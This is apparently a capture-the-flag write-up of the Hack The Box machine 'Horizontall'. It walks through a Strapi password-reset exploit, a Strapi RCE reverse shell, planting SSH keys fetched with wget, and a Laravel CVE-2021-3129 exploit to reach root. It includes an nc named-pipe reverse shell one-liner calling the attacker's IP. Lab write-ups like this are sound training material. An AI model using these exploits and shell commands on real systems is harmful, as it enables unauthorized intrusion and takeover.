# Horizontall

## Writeup

**Difficulty : Easy**

![image](https://user-images.githubusercontent.com/56447720/151376380-387761f9-a8d1-4bfd-a363-e9404476922a.png)

### Port Scan

* 2 ports were open in this machine : 22, 80

```
└─$ nmap -p 22,80 -sC -sV horizontall.htb                                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 19:43 IST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds
```

### Subdomain

* There were no intresting directories for the website so I moved to find the subdomain
* One of the js files had the subdomain which saved a lot of time in scanning
* Js file link : `http://horizontall.htb/js/app.c68eb462.js`

```js
<--SNIPPED--> {var t=this;r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) <--SNIPPED-->
```

* Subdomain found : `api-prod.horizontall.htb` ( Add the subdomain in `/etc/hosts` )

### Directories

```bash
└─$ feroxbuster -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirb/big.txt                                                          1 ⨯

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.4.0
───────────────────────────┬──────────────────────
     Target Url            │ http://api-prod.horizontall.htb/
     Threads               │ 50
     Wordlist              │ /usr/share/wordlists/dirb/big.txt
     Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.4.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       16l      101w      854c http://api-prod.horizontall.htb/Admin
200       16l      101w      854c http://api-prod.horizontall.htb/ADMIN
200       16l      101w      854c http://api-prod.horizontall.htb/admin
200        1l        7w     1150c http://api-prod.horizontall.htb/favicon.ico
200        1l       21w      507c http://api-prod.horizontall.htb/reviews
200        3l       21w      121c http://api-prod.horizontall.htb/robots.txt
403        1l        1w       60c http://api-prod.horizontall.htb/users
[####################] - 1m     20468/20468   0s      found:7       errors:0      
[####################] - 1m     20468/20468   219/s   http://api-prod.horizontall.htb/

```

### web Exploitation

* Alright, so among all the directories , the /admin was userful

![image](https://user-images.githubusercontent.com/56447720/151378973-c3abe02b-a0b6-4380-9d56-a7083ca18cbe.png)

* It uses starpi cms
*   What's Starpi ?

    > Strapi is an open-source headless CMS used for building fast and easily manageable APIs written in JavaScript. It enables developers to make flexible API structures easily using a beautiful user interface. Strapi can be used with various databases including MongoDB, PostgreSQL, etc.

#### Starpi Version

* I didn't found anything on the website that tells us the starpi version
* So, I used feroxbuster again, to find sub directoires.
* I found an intresting directory that gaves the starpi version used in the server ( `http://api-prod.horizontall.htb/admin/init` )

```bash

└─$ curl http://api-prod.horizontall.htb/admin/init
{"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}      

```

* starpi verison is : `3.0.0-beta.17.4`

#### Exploit

* Public exploit link : `https://www.exploit-db.com/exploits/50239`
* Download or copy the exploit to get login details
* Login details :

```bash
└─$ python3 exploit.py http://api-prod.horizontall.htb                                                                                            1 ⨯
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzMjk1MDQ3LCJleHAiOjE2NDU4ODcwNDd9.FxVxaCiduAAdIqnIHvmox5o330ARzD1-Z7DPAPjxYdg

```

* Login details : \[ admin:SuperStrongPassword1 ]

#### User Shell

* Exploit link for RCE : `https://github.com/diego-tella/CVE-2019-19609-EXPLOIT`

```bash

# TERMINAL 1 :
# Setup a listener before using the exploit 

└─$ nc -nvlp 4444                                                                                                                                 1 ⨯
listening on [any] 4444 ...



# TERMINAL 2 :

└─$ python3 rce.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzMjk1NzczLCJleHAiOjE2NDU4ODc3NzN9.4aUFn0Cx5J5hpjbtY-RxS5TNPVjG101BMeGnY22XrCQ -l <YOUR_IP> -p 4444 

```

* We got the user shell

**User flag**

```bash
strapi@horizontall:/home$ cat /home/developer/user.txt
cat /home/developer/user.txt
8e051bdafc84f_<--SNIPPED-->

```

### Enumeration

* There were some ports open listening on localhost

```bash
strapi@horizontall:/tmp$ netstat -a
netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:1337          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:40620         localhost:1337          TIME_WAIT  
<--SNIPPED-->
```

* Enumerate port 8000

```bash
strapi@horizontall:/tmp$ curl http://localhost:8000
curl http://localhost:8000
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

                            
                            <--SNIPPED-->


                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>

```

* Vulnerable application : `Laravel v8 (PHP v7.4.18)`

#### SSH port forwading

* We have the permission to write in `/opt/strapi`

```bash
strapi@horizontall:~$ ls -la /opt/strapi
ls -la /opt/strapi
total 52
drwxr-xr-x 10 strapi strapi 4096 Jan 27 10:13 .
drwxr-xr-x  3 root   root   4096 May 26  2021 ..
-rw-r--r--  1 strapi strapi  231 Jun  1  2021 .bash_logout
-rw-r--r--  1 strapi strapi 3810 Jun  1  2021 .bashrc
drwx------  2 strapi strapi 4096 May 26  2021 .cache
drwx------  3 strapi strapi 4096 May 26  2021 .config
drwx------  4 strapi strapi 4096 Jan 27 11:26 .gnupg
drwxrwxr-x  3 strapi strapi 4096 Jun  1  2021 .local
drwxr-xr-x  9 strapi strapi 4096 Jan 27 10:57 myapi
drwxrwxr-x  5 strapi strapi 4096 Jan 27 14:51 .npm
drwxrwxr-x  5 strapi strapi 4096 Jan 27 05:24 .pm2
-rw-r--r--  1 strapi strapi  807 Apr  4  2018 .profile
drwxrwxr-x  2 strapi strapi 4096 Jan 27 10:16 .ssh

```

* We will add our .pub file in the machine to get a shell and for port forward

#### Required Files for port forward

* SSH keys
* use `ssh-keygen -t rsa` to create 2 files `id_rsa` and `authorized keys`
* Learn more about port forwarding : `https://phoenixnap.com/kb/ssh-port-forwarding`
* Rename the `.pub` file to `authorized_keys` and the other file to `id_rsa`
* Download the `authorized_keys` in the machine in `/opt/strapi/.ssh`
* I've used python3 server

```bash
└─$ python3 -m http.server 80                                                                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.105 - - [27/Jan/2022 21:42:04] "GET /authorized_keys HTTP/1.1" 200 -

```

* wget it in the machine

```bash
strapi@horizontall:~/.ssh$ wget http://<YOUR_IP>/authorized_keys
wget http://<YOUR_IP>/authorized_keys
--2022-01-27 16:11:20--  http://<YOUR_IP>/authorized_keys
Connecting to <YOUR_IP>:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 568 [application/vnd.exstream-package]
Saving to: ‘authorized_keys’

auhtorized_keys          100%[===================>]     568  --.-KB/s    in 0s      

2022-01-27 16:11:21 (27.9 MB/s) - ‘authorized_keys’ saved [568/568]

strapi@horizontall:~/.ssh$ ls
ls
authorized_keys
strapi@horizontall:~/.ssh$ cat *
cat *
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCJ5TFuWgJ5SOHci9qv7oU0NtYB/7L/2h2+LZGHreS6MgNx1ydjwvYwSzFHB2tUAWHlNJajMqSP/K+DQrTIkrnQwwxKRvJW55ECH/40bkM9xiyutmMJi1WmQ8onKJG1EcvCr3vZc3dZVVbFORwTxbf/B0Ftdx1Uysr2+Q5EBBjKjR41NK8oAaiYItG6tvpyMcBvwG4U3RkFSPbZ4RCC5LvyqCp6rhWJcxgtmH6ssgMj0bC9ZLSVg56QTy2iq0Jqa0Jpq5F/eM35so/kPIySf/EfSARZjHBToC9oeEPLvqAP8h2d1DLiPBSnCl5OyvXafBaw0SQ7uTCedAHnOHXP6Wkqw4A0zu3peVO8m4eMajtSQjelUtlQSOnVR7FriJmMQsYXA9AP3ULHtxgNXRnoUxXGqM8hUJmpA5iw90Ns7PbmD4liD0DRSLKwnOHXffoZkqG/pqAU/+htA1OGonrzijDcWcibLzvd3SZIgDq2+3pdHYBQXyEBUq0+fGvdM5stTs=

```

### Root Shell

* Homepage of the application running on port 8000

![image](https://user-images.githubusercontent.com/56447720/151400269-65a47101-f58b-48a3-ac0f-3efb1a0b6bee.png)

* Exploit used to get root priviliges : `https://github.com/nth347/CVE-2021-3129_exploit`

```bash
└─$ python3 root.py http://127.0.0.1:8000 Monolog/RCE1 whoami
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

root

[i] Trying to clear logs
[+] Logs cleared

```

#### Root Flag

```bash
└─$ python3 root.py http://127.0.0.1:8000 Monolog/RCE1 "cat /root/root.txt"                                                                       1 ⨯
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

edaf3a8f9_<--SNIPPED-->

[i] Trying to clear logs
[+] Logs cleared

```

## Root Shell (nc part)

* Open nc connection on any port

```bash
└─$ python3 root.py http://127.0.0.1:8000 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[i] There is no output

```

### shell

```bash
└─$ nc -nvlp 6666                
listening on [any] 6666 ...
connect to [<YOUR_IP_WOULD_BE_HERE>] from (UNKNOWN) [10.10.11.105] 34418
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

```
